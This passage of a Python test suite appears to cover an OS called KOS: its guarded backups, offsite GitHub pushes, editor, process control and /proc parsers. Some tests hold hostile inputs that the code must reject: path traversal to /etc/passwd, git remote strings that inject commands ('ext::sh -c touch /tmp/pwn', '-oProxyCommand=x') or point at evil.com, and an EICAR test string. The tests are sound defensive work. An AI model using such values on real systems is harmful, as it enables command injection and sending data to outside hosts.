        self.assertEqual([b["name"] for b in kbackup.list_backups(self.paths)], [info["name"]])
        self.assertEqual(oct(Path(info["path"]).stat().st_mode & 0o777), "0o600")
        self.assertEqual(Ledger_owed(self.paths), [])               # the scan it owed was done

    def test_it_needs_the_password(self):
        with self.assertRaises(AuthorizationDenied):
            kbackup.create(self.paths, self.authority("no", "no", "no"), str(self.docs))
        self.assertEqual(kbackup.list_backups(self.paths), [])

    def test_a_flagged_document_is_quarantined_not_kept(self):
        (self.docs / "virus.txt").write_bytes(EICAR)
        with self.assertRaises(WriteBlocked):
            kbackup.create(self.paths, self.authority(PW), str(self.docs))
        self.assertEqual(kbackup.list_backups(self.paths), [])
        self.assertEqual(len(list((self.paths.state / "quarantine").glob("write-*.zip"))), 1)
        self.assertEqual(Ledger_owed(self.paths), [])

    def test_kos_state_and_missing_paths_are_refused(self):
        self.paths.ensure()
        for bad in (str(self.paths.state), str(self.paths.etc), str(self.docs / "nope")):
            with self.assertRaises(AdminError):
                kbackup.create(self.paths, self.authority(PW), bad)

    def test_restore_reads_only_real_members_of_real_backups(self):
        info = kbackup.create(self.paths, self.authority(PW), str(self.docs))
        self.assertEqual(kbackup.read_member(self.paths, info["name"], "docs/a.txt"), b"alpha")
        for backup, member in ((info["name"], "../../etc/passwd"), (info["name"], "/etc/passwd"),
                               (info["name"], "docs/missing"), ("../x.zip", "docs/a.txt"),
                               ("nope.zip", "docs/a.txt")):
            with self.assertRaises(AdminError, msg=(backup, member)):
                kbackup.read_member(self.paths, backup, member)


def Ledger_owed(paths):
    from kos.requires import Ledger
    return Ledger(paths).owed()


class TestEditorBackupBridge(AdminEnv):
    def setUp(self):
        super().setUp()
        self.sent = []
        self.work = Path(self.tmp.name) / "work"
        self.work.mkdir()
        self.kb_ = self.booted()

    def ask(self, req, *answers):
        with mock.patch("kos.system.AdminKeyboard", lambda paths: self.kb_):
            SystemBridge(self.paths).handle({"cmd": "request", **req}, self.sent.append,
                                            self.authority(*answers))
        return self.sent[-1]

    def test_view_marks_files_that_would_not_round_trip_as_lossy(self):
        plain, tabbed, crlf, longline = (self.work / n for n in ("p", "t", "c", "l"))
        plain.write_text("one\ntwo\n")
        tabbed.write_text("a\tb\n")
        crlf.write_bytes(b"a\r\nb\r\n")
        longline.write_text("x" * 500 + "\n")
        for f, lossy in ((plain, False), (tabbed, True), (crlf, True), (longline, True)):
            r = self.ask({"action": "view", "path": str(f)}, PW)
            self.assertEqual(r["lossy"], lossy, f.name)

    def test_save_is_a_guarded_write_and_keeps_the_file_mode(self):
        f = self.work / "n.txt"
        f.write_text("old\n")
        os.chmod(f, 0o640)
        r = self.ask({"action": "save", "path": str(f), "text": "new\nlines\n"}, PW)
        self.assertEqual(r["cmd"], "text")
        self.assertEqual(f.read_text(), "new\nlines\n")
        self.assertEqual(oct(f.stat().st_mode & 0o777), "0o640")
        self.assertTrue(any("security scan: clean" in l for l in r["lines"]))
        self.assertEqual(Ledger_owed(self.paths), [])

    def test_save_needs_the_admin_keyboard_the_password_and_a_clean_scan(self):
        f = self.work / "n.txt"
        r = self.ask({"action": "save", "path": str(f), "text": "x\n"}, "no", "no", "no")
        self.assertFalse(r["ok"])
        self.assertFalse(f.exists())
        r = self.ask({"action": "save", "path": str(f), "text": EICAR.decode() + "\n"}, PW)
        self.assertFalse(r["ok"])
        self.assertIn("security scan", r["detail"])
        self.assertFalse(f.exists())                                  # quarantined afterwards
        self.kb_.shutdown()
        r = self.ask({"action": "save", "path": str(f), "text": "x\n"})   # refused before any prompt
        self.assertFalse(r["ok"])
        self.assertIn("not booted", r["detail"])

    def test_backup_list_and_restore_go_through_the_guarded_write(self):
        docs = self.work / "docs"
        docs.mkdir()
        (docs / "a.txt").write_text("alpha")
        r = self.ask({"action": "backup", "path": str(docs)}, PW)
        self.assertIn("backed up 1 file(s)", r["lines"][0])
        name = self.ask({"action": "backups"})["backups"][0]["name"]
        dest = self.work / "restored.txt"
        r = self.ask({"action": "restore", "backup": name, "member": "docs/a.txt", "to": str(dest)}, PW)
        self.assertEqual(dest.read_text(), "alpha")
        self.assertEqual(r["lines"][0], "restored docs/a.txt")
        self.kb_.shutdown()                                           # no admin keyboard -> no restore
        r = self.ask({"action": "restore", "backup": name, "member": "docs/a.txt",
                      "to": str(self.work / "again.txt")})
        self.assertFalse(r["ok"])
        self.assertFalse((self.work / "again.txt").exists())

    def test_line_shell_backs_up_in_plain_language(self):
        docs = self.work / "d"
        docs.mkdir()
        (docs / "a.txt").write_text("a")
        out = self.ask({"action": "line", "text": f"respalda {docs}"}, PW)["lines"]
        self.assertIn("backed up 1 file(s)", out[0])


class TestEditorAndBackupAppsRunForReal(DesktopSessionEnv):
    def admin(self):
        kb = AdminKeyboard(self.paths, kernel_report=lambda: dict(GOOD_KERNEL),
                           probe=lambda: ["/dev/input/event0"], boot_id=lambda: "boot-1")
        with self.authority(PW).authorize("session.login") as g:
            kb.boot(g)
        return kb

    def test_editor_opens_edits_and_saves_through_the_guarded_write(self):
        f = Path(self.tmp.name) / "note.txt"
        f.write_text("hello\n")
        kb = self.admin()
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        with mock.patch("kos.system.AdminKeyboard", lambda paths: kb):
            s = self.start(SYSTEM_DIR / "editor", "editor", bridge=SystemBridge(self.paths), authority=auth)
            self.boot_both()
            threading.Timer(2.5, lambda: self.devices.push(*_keys(str(f)), ENTER)).start()
            self.when_modal("Password to view file", [*_keys(PW), ENTER])
            threading.Timer(7.0, lambda: self.devices.push(*_keys("X"),
                                                          {"type": "key", "key": "ctrl-s"})).start()
            self.when_modal("Password to write file", [*_keys(PW), ENTER])
            threading.Timer(15.0, lambda: self.devices.push({"type": "interrupt"})).start()
            s.run(first_frame_timeout=1.0)
        self.assertEqual(f.read_text(), "Xhello\n")                  # typed X at the start, saved
        self.assertIn("saved.", self.output())
        self.assertEqual(Ledger_owed(self.paths), [])               # scan + optimize were done

    def test_editor_opens_a_lossy_file_read_only_and_never_saves_it(self):
        f = Path(self.tmp.name) / "tabbed.txt"
        f.write_text("a\tb\n")
        kb = self.admin()
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        with mock.patch("kos.system.AdminKeyboard", lambda paths: kb):
            s = self.start(SYSTEM_DIR / "editor", "editor", bridge=SystemBridge(self.paths), authority=auth)
            self.boot_both()
            threading.Timer(2.5, lambda: self.devices.push(*_keys(str(f)), ENTER)).start()
            self.when_modal("Password to view file", [*_keys(PW), ENTER])
            threading.Timer(7.0, lambda: self.devices.push(*_keys("X"),
                                                          {"type": "key", "key": "ctrl-s"})).start()
            threading.Timer(10.0, lambda: self.devices.push({"type": "interrupt"})).start()
            s.run(first_frame_timeout=1.0)
        self.assertIn("READ-ONLY", self.output())
        self.assertEqual(f.read_text(), "a\tb\n")                    # untouched

    def test_backup_app_backs_a_folder_up_after_the_password(self):
        docs = Path(self.tmp.name) / "mydocs"
        docs.mkdir()
        (docs / "a.txt").write_text("alpha")
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        s = self.start(SYSTEM_DIR / "backup", "backup", bridge=SystemBridge(self.paths), authority=auth)
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push(*_keys("n" + str(docs)), ENTER)).start()
        self.when_modal("Password to back up files", [*_keys(PW), ENTER])
        threading.Timer(9.0, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        backups = kbackup.list_backups(self.paths)
        self.assertEqual(len(backups), 1)
        self.assertIn("backed up 1 file(s)", self.output())
        self.assertIn(backups[0]["name"], self.output())


import subprocess as _sp  # noqa: E402
from kos.offsite import GITHUB_RE, Offsite, OffsiteError  # noqa: E402


class TestOffsite(AdminEnv):
    def setUp(self):
        super().setUp()
        docs = Path(self.tmp.name) / "docs"
        docs.mkdir()
        (docs / "a.txt").write_text("alpha")
        self.info = kbackup.create(self.paths, self.authority(PW), str(docs))
        self.bare = Path(self.tmp.name) / "remote.git"
        _sp.run(["git", "init", "-q", "--bare", "-b", "main", str(self.bare)], check=True)
        self.public = [False]
        self.off = Offsite(self.paths, public_check=lambda url: self.public[0], allow_any_remote=True)
        self.off.set_remote(self.authority(PW), f"file://{self.bare}")

    def remote_has(self, name):
        r = _sp.run(["git", "--git-dir", str(self.bare), "ls-tree", "-r", "--name-only", "main"],
                    capture_output=True, text=True)
        return name in r.stdout.split()

    def test_push_sends_the_backup_to_a_private_repository_after_the_password(self):
        msg = self.off.push(self.authority(PW), self.info["name"])
        self.assertIn(self.info["name"], msg)
        self.assertTrue(self.remote_has(self.info["name"]))
        blob = _sp.run(["git", "--git-dir", str(self.bare), "show", f"main:{self.info['name']}"],
                       capture_output=True).stdout
        self.assertEqual(blob, Path(self.info["path"]).read_bytes())
        self.off.push(self.authority(PW), self.info["name"])           # pushing again is fine

    def test_a_publicly_readable_repository_is_refused_before_any_password(self):
        self.public[0] = True
        with self.assertRaises(OffsiteError) as ctx:
            self.off.push(self.authority(), self.info["name"])         # no answers: no prompt
        self.assertIn("publicly readable", str(ctx.exception))
        self.assertFalse(self.remote_has(self.info["name"]))

    def test_repository_that_turns_public_during_the_prompt_is_still_refused(self):
        answers = iter([False, True])
        off = Offsite(self.paths, public_check=lambda url: next(answers), allow_any_remote=True)
        with self.assertRaises(OffsiteError):
            off.push(self.authority(PW), self.info["name"])
        self.assertFalse(self.remote_has(self.info["name"]))

    def test_needs_a_remote_the_password_and_a_real_backup_name(self):
        none = Offsite(Paths(Path(self.tmp.name) / "empty"), public_check=lambda u: False)
        with self.assertRaises(OffsiteError):
            none.push(self.authority(), "x.zip")
        with self.assertRaises(AuthorizationDenied):
            self.off.push(self.authority("no", "no", "no"), self.info["name"])
        for bad in ("../x.zip", "nope.zip", "a/b.zip", "x"):
            with self.assertRaises(OffsiteError, msg=bad):
                self.off.push(self.authority(PW), bad)
        self.assertFalse(self.remote_has(self.info["name"]))

    def test_only_github_repositories_can_be_the_destination(self):
        strict = Offsite(self.paths)
        for bad in ("https://evil.com/a/b", "http://github.com/a/b", "ext::sh -c touch /tmp/pwn",
                    "file:///tmp/x", "https://github.com/a", "https://github.com/a/b/c",
                    "git@evil.com:a/b.git", "-oProxyCommand=x"):
            with self.assertRaises(OffsiteError, msg=bad):
                strict.set_remote(self.authority(PW), bad)
        for good in ("https://github.com/me/docs-backup", "git@github.com:me/docs.git",
                     "https://github.com/me/docs.git"):
            self.assertTrue(GITHUB_RE.match(good), good)

    def test_the_anonymous_probe_cannot_use_any_credentials(self):
        calls = []

        def runner(cmd, **kw):
            calls.append((cmd, kw))
            return _sp.CompletedProcess(cmd, kw.pop("_rc", 128), b"", b"")

        strict = Offsite(self.paths, runner=runner)
        self.assertFalse(strict.is_public("git@github.com:me/docs.git"))   # auth needed -> private
        cmd, kw = calls[-1]
        self.assertEqual(cmd[-1], "https://github.com/me/docs.git")        # ssh url probed anonymously
        self.assertEqual(kw["env"]["GIT_TERMINAL_PROMPT"], "0")
        self.assertEqual(kw["env"]["GIT_CONFIG_GLOBAL"], os.devnull)
        self.assertEqual(kw["env"]["GIT_ASKPASS"], "/bin/true")
        self.assertEqual(kw["stdin"], _sp.DEVNULL)
        ok = Offsite(self.paths, runner=lambda cmd, **kw: _sp.CompletedProcess(cmd, 0, b"", b""))
        self.assertTrue(ok.is_public("https://github.com/me/docs"))        # readable anonymously -> public

    def test_the_backup_app_can_push_via_the_bridge(self):
        sent = []
        with mock.patch("kos.offsite.Offsite", lambda paths: self.off):
            SystemBridge(self.paths).handle(
                {"cmd": "request", "action": "push", "backup": self.info["name"]},
                sent.append, self.authority(PW))
        self.assertEqual(sent[-1]["cmd"], "text")
        self.assertTrue(self.remote_has(self.info["name"]))
        self.public[0] = True
        with mock.patch("kos.offsite.Offsite", lambda paths: self.off):
            SystemBridge(self.paths).handle(
                {"cmd": "request", "action": "push", "backup": self.info["name"]},
                sent.append, self.authority())
        self.assertFalse(sent[-1]["ok"])
        self.assertIn("publicly readable", sent[-1]["detail"])


class TestEachUserUsesTheirOwnGitHub(AdminEnv):
    """The OS is for many people: nobody's backups go to anyone else's GitHub."""

    def ask(self, req, *answers):
        sent = []
        SystemBridge(self.paths).handle({"cmd": "request", **req}, sent.append, self.authority(*answers))
        return sent[-1]

    def test_the_destination_is_whatever_this_user_set_and_defaults_to_nothing(self):
        self.assertEqual(self.ask({"action": "backups"})["remote"], "")
        r = self.ask({"action": "remote", "url": "https://github.com/some-user/their-docs"}, PW)
        self.assertTrue(r["ok"])
        self.assertEqual(self.ask({"action": "backups"})["remote"], "https://github.com/some-user/their-docs")
        # another person's machine (a separate KOS root) knows nothing of it
        with tempfile.TemporaryDirectory() as other:
            self.assertIsNone(Offsite(Paths(Path(other))).remote())

    def test_setting_it_needs_the_password_and_refuses_anything_but_github(self):
        r = self.ask({"action": "remote", "url": "https://github.com/me/docs"}, "no", "no", "no")
        self.assertFalse(r["ok"])
        self.assertEqual(self.ask({"action": "backups"})["remote"], "")
        r = self.ask({"action": "remote", "url": "https://evil.com/me/docs"}, PW)
        self.assertFalse(r["ok"])
        self.assertIn("GitHub repository", r["detail"])

    def test_no_account_is_baked_into_the_code(self):
        root = Path(__file__).resolve().parent.parent
        for f in list((root / "kos").glob("*.py")) + list((root / "examples").rglob("*.py")):
            self.assertNotIn("zach909", f.read_text(), f.name)


class TestCellsRefuseNpmApps(Env):
    def test_an_npm_app_is_refused_inside_a_cell_with_a_clear_reason(self):
        from kos.cellagent import handle
        a, b = socket.socketpair()
        send_app(a, KApp(self.kapp.read_bytes()), "tui")           # hello is an npm app now
        with self.assertRaises(ValueError) as ctx:
            handle(b, SandboxPolicy())
        self.assertIn("no Node.js inside a cell", str(ctx.exception))
        a.close()
        b.close()


# ---------------------------------------------------------------------------
# The core OS services: facts (osinfo), control (proctl, fschange), and the apps
# ---------------------------------------------------------------------------
import subprocess as _subp  # noqa: E402
from kos import osinfo  # noqa: E402
from kos.fschange import FsChangeError, change as fs_change, empty_old_trash  # noqa: E402
from kos.proctl import ProcessError, renice, signal_process  # noqa: E402


class TestServiceRequestsProtocol(unittest.TestCase):
    def v(self, **m):
        return validate_app_message({"cmd": "request", **m}, "tui")

    def test_valid_requests(self):
        for kind in osinfo.KINDS:
            self.assertEqual(self.v(action="sys", kind=kind)["kind"], kind)
        self.assertEqual(self.v(action="sys", kind="stat", arg="/etc")["arg"], "/etc")
        self.assertEqual(self.v(action="signal", pid=1234, sig="TERM")["sig"], "TERM")
        self.assertEqual(self.v(action="renice", pid=1234, nice=5)["nice"], 5)
        self.assertEqual(self.v(action="fschange", op="chmod", path="/tmp/x", mode="644")["mode"], "644")
        self.assertEqual(self.v(action="fschange", op="rename", path="/tmp/a", to="/tmp/b")["to"], "/tmp/b")
        self.assertEqual(self.v(action="netcheck")["action"], "netcheck")

    def test_hostile_requests_are_rejected(self):
        for bad in (dict(action="sys", kind="shadow"), dict(action="sys", kind="stat", arg="a\x00"),
                    dict(action="signal", pid=1, sig="TERM"), dict(action="signal", pid=True, sig="TERM"),
                    dict(action="signal", pid=99, sig="SEGV"), dict(action="signal", pid="99", sig="TERM"),
                    dict(action="renice", pid=99, nice=-5), dict(action="renice", pid=99, nice=20),
                    dict(action="fschange", op="rm", path="/tmp/x"),
                    dict(action="fschange", op="chmod", path="/tmp/x", mode="4755x"),
                    dict(action="fschange", op="chmod", path="/tmp/x", mode="rwx"),
                    dict(action="fschange", op="rename", path="/tmp/x")):
            with self.assertRaises(ProtocolError, msg=bad):
                self.v(**bad)


class TestOsInfoParsers(unittest.TestCase):
    """The parsers, against a fake /proc (so they are exact on any machine)."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.proc = Path(self.tmp.name)
        self.addCleanup(self.tmp.cleanup)

    def put(self, rel, text):
        f = self.proc / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text)

    def test_memory(self):
        self.put("meminfo", "MemTotal: 1000 kB\nMemFree: 100 kB\nMemAvailable: 600 kB\nCached: 300 kB\n"
                            "SwapTotal: 200 kB\nSwapFree: 150 kB\nDirty: 4 kB\n")
        self.put("vmstat", "pgfault 77\npswpout 5\nunrelated 1\noom_kill 2\n")
        self.put("swaps", "Filename Type Size Used Priority\n/swapfile file 200 50 -2\n")
        self.put("pressure/memory", "some avg10=1.50 avg60=0.00 avg300=0.00 total=1\nfull avg10=0.00\n")
        self.put("sys/vm/swappiness", "60\n")
        m = osinfo.memory(str(self.proc))
        self.assertEqual((m["kb"]["MemTotal"], m["kb"]["MemAvailable"], m["kb"]["SwapFree"]), (1000, 600, 150))
        self.assertEqual(m["vm"], {"pgfault": 77, "pswpout": 5, "oom_kill": 2})
        self.assertEqual(m["swaps"], [{"file": "/swapfile", "type": "file", "size_kb": 200, "used_kb": 50}])
        self.assertEqual(m["pressure"]["memory"]["avg10"], "1.50")
        self.assertEqual(m["swappiness"], 60)

    def test_processes_even_with_awkward_names(self):
        self.put("loadavg", "0.50 0.25 0.10 2/100 999\n")
        self.put("uptime", "1234.5 99.0\n")
        self.put("42/stat", "42 (my (weird) app) S 1 42 42 0 -1 0 0 0 0 0 150 50 0 0 20 5 3 0 777 "
                            "1000000 25 0 0\n")
        self.put("42/status", "Name:\tmy\nUid:\t1000\t1000\t1000\t1000\nVmRSS:\t2048 kB\n"
                              "voluntary_ctxt_switches:\t10\nnonvoluntary_ctxt_switches:\t3\n")
        self.put("42/cmdline", "/usr/bin/my\x00--flag\x00")
        p = osinfo.processes(str(self.proc))
        self.assertEqual(p["load"], [0.5, 0.25, 0.1])
        r = p["processes"][0]
        self.assertEqual((r["pid"], r["name"], r["state"], r["ppid"]), (42, "my (weird) app", "S", 1))
        self.assertEqual((r["cpu_ticks"], r["nice"], r["priority"], r["threads"]), (200, 5, 20, 3))
        self.assertEqual((r["rss_kb"], r["vol_switches"], r["invol_switches"]), (2048, 10, 3))
        self.assertEqual(r["cmd"], "/usr/bin/my --flag")

    def test_network_and_connection_decoding(self):
        self.put("net/dev", "Inter-| Receive | Transmit\n face |bytes packets errs drop fifo frame compressed multicast"
                            "|bytes packets errs drop fifo colls carrier compressed\n"
                            "  eth0: 1000 10 1 2 0 0 0 0 2000 20 3 4 0 0 0 0\n")
        self.put("net/route", "Iface Destination Gateway Flags\neth0 00000000 0100A8C0 0003\n")
        self.put("net/tcp", "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
                            "   0: 0100007F:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000 0 12345 1\n")
        self.put("net/unix", "Num RefCount Protocol Flags Type St Inode Path\n"
                             "0000: 00000002 00000000 00010000 0001 01 111 /run/x.sock\n")
        self.put("net/snmp", "Ip: InReceives OutRequests\nIp: 5 6\nTcp: CurrEstab ActiveOpens\nTcp: 2 3\n")
        n = osinfo.network(str(self.proc), str(self.proc / "sys"))
        eth = n["interfaces"][0]
        self.assertEqual((eth["name"], eth["rx_bytes"], eth["rx_errors"], eth["tx_drop"]), ("eth0", 1000, 1, 4))
        self.assertEqual(n["gateway"], "192.168.0.1 via eth0")
        c = n["connections"][0]
        self.assertEqual((c["local"], c["state"], c["uid"], c["inode"]), ("127.0.0.1:80", "LISTEN", 1000, 12345))
        self.assertEqual(n["unix"][0]["path"], "/run/x.sock")
        self.assertEqual(n["protocols"]["Tcp"]["CurrEstab"], 2)
        self.assertEqual(osinfo._addr("00000000000000000000000001000000:0050"), "::1:80")

    def test_permissions_are_described_exactly(self):
        with tempfile.TemporaryDirectory() as d:
            f = Path(d) / "prog"
            f.write_text("x")
            os.chmod(f, 0o4755)
            s = osinfo.stat_path(str(f))
            self.assertEqual((s["mode"], s["octal"], s["setuid"]), ("-rwsr-xr-x", "4755", True))
            os.chmod(f, 0o640)
            s = osinfo.stat_path(str(f))
            self.assertEqual((s["mode"], s["setuid"]), ("-rw-r-----", False))
            self.assertEqual(osinfo._mode_string(0o41777), "drwxrwxrwt")

    def test_real_system_smoke(self):
        for kind in ("processes", "memory", "mounts", "devices", "network", "health", "resources", "isolation"):
            with tempfile.TemporaryDirectory() as d:
                data = osinfo.KINDS[kind](Paths(Path(d)), "")
                json.dumps(data)                                   # everything is plain JSON
        p = osinfo.processes()
        self.assertTrue(any(r["pid"] == os.getpid() for r in p["processes"]))
        self.assertGreater(osinfo.memory()["kb"]["MemTotal"], 0)


class TestProcessControl(Env):
    def spawn(self):
        proc = _subp.Popen(["sleep", "60"])
        self.addCleanup(lambda: (proc.kill(), proc.wait()))
        return proc

    def test_terminate_needs_the_password_and_works(self):
        proc = self.spawn()
        with self.assertRaises(AuthorizationDenied):
            signal_process(self.authority("no", "no", "no"), proc.pid, "TERM")
        self.assertIsNone(proc.poll())
        self.assertIn("sent TERM", signal_process(self.authority(PW), proc.pid, "TERM"))
        self.assertEqual(proc.wait(5), -15)

    def test_pause_and_resume(self):
        proc = self.spawn()
        signal_process(self.authority(PW), proc.pid, "STOP")
        _time.sleep(0.2)
        self.assertIn("T", osinfo._read(f"/proc/{proc.pid}/stat").rpartition(")")[2].split()[0])
        signal_process(self.authority(PW), proc.pid, "CONT")

    def test_the_guards_hold(self):
        auth = lambda: self.authority()                           # no answers: must refuse before asking
        for pid in (1, os.getpid(), os.getppid(), 4194300):
            with self.assertRaises(ProcessError, msg=pid):
                signal_process(auth(), pid, "KILL")
        with self.assertRaises(ProcessError):
            signal_process(auth(), self.spawn().pid, "SEGV")
        with self.assertRaises(ProcessError):
            renice(auth(), self.spawn().pid, 40)

    def test_renice_raises_the_nice_value(self):
        proc = self.spawn()
        renice(self.authority(PW), proc.pid, 7)
        self.assertEqual(os.getpriority(os.PRIO_PROCESS, proc.pid), 7)


class TestFsChange(AdminEnv):
    def setUp(self):
        super().setUp()
        self.kb_ = self.booted()
        self.work = Path(self.tmp.name) / "w"
        self.work.mkdir()

    def go(self, op, path, *answers, **kw):
        return fs_change(self.paths, self.authority(*answers), self.kb_, op, str(path), **kw)

    def test_mkdir_rename_chmod_and_trash(self):
        self.assertIn("made folder", self.go("mkdir", self.work / "d", PW))
        (self.work / "f.txt").write_text("x")
        self.go("rename", self.work / "f.txt", PW, to=str(self.work / "g.txt"))
        self.assertTrue((self.work / "g.txt").exists() and not (self.work / "f.txt").exists())
        self.go("chmod", self.work / "g.txt", PW, mode="600")
        self.assertEqual(oct((self.work / "g.txt").stat().st_mode & 0o777), "0o600")
        self.go("trash", self.work / "g.txt", PW)
        self.assertFalse((self.work / "g.txt").exists())
        trashed = list((self.paths.state / "trash").glob("*-g.txt"))
        self.assertEqual([t.read_text() for t in trashed], ["x"])           # recoverable, not destroyed

    def test_it_needs_the_password_and_the_admin_keyboard(self):
        with self.assertRaises(AuthorizationDenied):
            self.go("mkdir", self.work / "d", "no", "no", "no")
        self.assertFalse((self.work / "d").exists())
        self.kb_.shutdown()
        with self.assertRaises(FsChangeError) as ctx:
            self.go("mkdir", self.work / "d")                              # refused before any prompt
        self.assertIn("admin.keyboard", str(ctx.exception))

    def test_the_guards_hold(self):
        (self.work / "f").write_text("x")
        (self.work / "g").write_text("y")
        self.paths.ensure()
        for op, path, kw in (("trash", self.paths.state, {}), ("chmod", self.paths.etc, {"mode": "777"}),
                             ("mkdir", self.paths.state / "evil", {}), ("trash", "/", {}),
                             ("rename", self.work / "f", {"to": str(self.work / "g")}),   # no overwrite
                             ("chmod", self.work / "f", {"mode": "4755"}),                 # no setuid
                             ("chmod", self.work / "f", {"mode": "2755"}),
                             ("chmod", self.work / "f", {"mode": "rwx"}),
                             ("trash", self.work / "nope", {}), ("mkdir", self.work / "f", {}),
                             ("format", self.work / "f", {})):
            with self.assertRaises(FsChangeError, msg=(op, path)):
                self.go(op, path, **kw)
        self.assertEqual((self.work / "g").read_text(), "y")

    def test_old_trash_is_forgotten_by_optimize(self):
        (self.work / "f.txt").write_text("x")
        self.go("trash", self.work / "f.txt", PW)
        self.assertEqual(empty_old_trash(self.paths), 0)                   # fresh: kept
        self.assertEqual(empty_old_trash(self.paths, now=_time.time() + 40 * 86400), 1)
        self.assertEqual(list((self.paths.state / "trash").iterdir()), [])


class TestServiceBridge(Env):
    def ask(self, req, *answers):
        sent = []
        SystemBridge(self.paths).handle({"cmd": "request", **req}, sent.append, self.authority(*answers))
        return sent[-1]

    def test_sys_returns_every_kind_as_json(self):
        for kind in osinfo.KINDS:
            r = self.ask({"action": "sys", "kind": kind, "arg": "/etc"})
            self.assertEqual((r["cmd"], r["kind"]), ("sys", kind))
            json.dumps(r)

    def test_signal_through_the_bridge_needs_the_password(self):
        proc = _subp.Popen(["sleep", "60"])
        self.addCleanup(lambda: (proc.kill(), proc.wait()))
        r = self.ask({"action": "signal", "pid": proc.pid, "sig": "TERM"}, "no", "no", "no")
        self.assertFalse(r["ok"])
        self.assertIsNone(proc.poll())
        r = self.ask({"action": "signal", "pid": proc.pid, "sig": "TERM"}, PW)
        self.assertTrue(r["ok"])
        self.assertEqual(proc.wait(5), -15)
        self.assertFalse(self.ask({"action": "signal", "pid": 1, "sig": "KILL"})["ok"])

    def test_the_internet_check_contacts_the_outside_only_after_the_password(self):
        calls = []
        with mock.patch("kos.osinfo.net_check", lambda *a, **k: (calls.append(1), (True, "internet reachable (9 ms)"))[1]):
            r = self.ask({"action": "netcheck"}, "no", "no", "no")
            self.assertFalse(r["ok"])
            self.assertEqual(calls, [])
            r = self.ask({"action": "netcheck"}, PW)
        self.assertEqual((r["ok"], calls), (True, [1]))

    def test_ticks_flag_is_recorded_from_the_manifest(self):
        out = Path(self.tmp.name) / "p.kapp"
        pack(SYSTEM_DIR / "processes", out)
        self.assertIn("ticks", KApp.from_file(out).manifest.permissions)


class TestServiceAppsRunForReal(DesktopSessionEnv):
    """Each OS-service app, started by `npm run start` inside the sandbox, drawing real data."""

    def go(self, name, keys=(), wait=5.0, needles=()):
        s = self.start(SYSTEM_DIR / name, name, bridge=SystemBridge(self.paths), ticks=True)
        self.boot_both()
        if keys:
            threading.Timer(3.0, lambda: self.devices.push(*keys)).start()
        threading.Timer(wait, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        out = self.output()
        for needle in needles:
            self.assertIn(needle, out, f"{name}: {needle!r} not on screen")
        return out

    def test_processes(self):
        self.go("processes", needles=("Tasks", "PID", "USER", "sorted by cpu"))

    def test_memory(self):
        self.go("memory", needles=("Physical memory", "RAM", "Swap", "Biggest users"))

    def test_filesystem(self):
        self.go("filesystem", needles=("Mounts", "TYPE", "nosuid"))

    def test_devices(self):
        self.go("devices", needles=("Disks", "Input", "Drivers"))

    def test_network(self):
        self.go("network", needles=("Interfaces", "gateway", "internet:"))

    def test_isolation(self):
        self.go("isolation", needles=("Apps", "Kernel hardening", "Access"))

    def test_health(self):
        self.go("health", needles=("Overall", "Hardware", "Connectivity"))

    def test_resources(self):
        self.go("resources", needles=("CPU", "Memory", "Disk", "KOS apps"))

    def test_updates(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        self.go("updates", needles=("Where things come from", "hello", "local file", "KOS itself", "Underneath", "python"))

    def test_apps_with_the_ticks_permission_get_a_tick_every_second_and_others_do_not(self):
        s = self.start(EXAMPLE, "hello", "cmd", ticks=True)
        self.boot_both()
        threading.Timer(3.2, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=0.3)
        self.assertGreaterEqual(self.output().count('"cmd":"tick"'), 2)

    def test_filesystem_makes_a_folder_with_the_admin_keyboard_and_a_password(self):
        work = Path(self.tmp.name) / "w"
        work.mkdir()
        kb = AdminKeyboard(self.paths, kernel_report=lambda: dict(GOOD_KERNEL),
                           probe=lambda: ["/dev/input/event0"], boot_id=lambda: "boot-1")
        with self.authority(PW).authorize("session.login") as g:
            kb.boot(g)
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        with mock.patch("kos.system.AdminKeyboard", lambda paths: kb):
            s = self.start(SYSTEM_DIR / "filesystem", "filesystem", bridge=SystemBridge(self.paths),
                           authority=auth, ticks=True)
            self.boot_both()
            threading.Timer(3.0, lambda: self.devices.push(*_keys("2/" + str(work)), ENTER)).start()
            threading.Timer(6.0, lambda: self.devices.push(*_keys("m"), *_keys("newdir"), ENTER)).start()
            self.when_modal("Password to change files", [*_keys(PW), ENTER])
            threading.Timer(12.0, lambda: self.devices.push({"type": "interrupt"})).start()
            s.run(first_frame_timeout=1.0)
        self.assertTrue((work / "newdir").is_dir())
        self.assertEqual(oct((work / "newdir").stat().st_mode & 0o777), "0o700")


# ---------------------------------------------------------------------------
# Where everything comes from, and updating it
# ---------------------------------------------------------------------------
import functools as _ft  # noqa: E402
import hashlib as _hl  # noqa: E402
import http.server as _http  # noqa: E402
import shutil as _shutil  # noqa: E402
from kos import provenance  # noqa: E402
from kos.sources import SourceError, Sources  # noqa: E402


def make_kapp(tmp: Path, version: str, *, permissions=(), extra: bytes = b"", name="hello") -> Path:
    """A real, valid npm app (a copy of hello) at the given version, packed into tmp."""
    src = Path(tempfile.mkdtemp(dir=tmp))
    _shutil.copytree(EXAMPLE, src / name)
    m = json.loads((src / name / "manifest.json").read_text())
    m.update(version=version, name=name, permissions=list(permissions))
    (src / name / "manifest.json").write_text(json.dumps(m))
    pkg = json.loads((src / name / "package.json").read_text())
    pkg.update(version=version, name=name)
    (src / name / "package.json").write_text(json.dumps(pkg))
    if extra:
        (src / name / "extra.bin").write_bytes(extra)
    out = tmp / f"{name}-{version}-{len(permissions)}{'x' if extra else ''}.kapp"
    pack(src / name, out)
    return out


class TestProvenance(Env):
    def test_an_installed_app_remembers_where_it_came_from(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        a = provenance.apps(self.paths)[0]
